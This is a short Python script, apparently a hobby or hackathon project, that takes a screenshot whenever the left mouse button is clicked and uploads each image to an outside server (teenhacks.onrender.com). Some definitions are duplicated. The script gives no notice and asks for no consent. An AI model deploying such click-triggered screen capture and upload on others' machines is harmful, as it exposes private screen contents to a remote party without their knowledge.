from mss import mss
from win32api import GetKeyState
import time
import requests

from mss import mss
import win32api
import time
import requests

def take_screenshot():
    with mss() as sct:
        try:
            response = requests.get('https://teenhacks.onrender.com/')
            if response.status_code != 200:
                raise Exception('Failed to retrieve website')
        except Exception as e:
            print(f'Failed to retrieve website: {str(e)}')
            return
        screenshot_path = sct.shot(output='screenshot.png')
        requests.post('https://teenhacks.onrender.com/upload', files={'image': open(screenshot_path, 'rb')})


def begin_ss(start):
    leftClick = win32api.GetKeyState(0x01)
    if leftClick < 0:
        if time.time() - start > .3:
            take_screenshot()
        start = time.time()
    time.sleep(.001)
    return start


        #sct.shot(output=f"Screenshots/screenshot{time.time()}.png")

def begin_ss(start):
    leftClick = GetKeyState(0x01)
    if leftClick < 0:
        if time.time() - start > .3:
            take_screenshot()
        start = time.time()
    time.sleep(.001)
    return start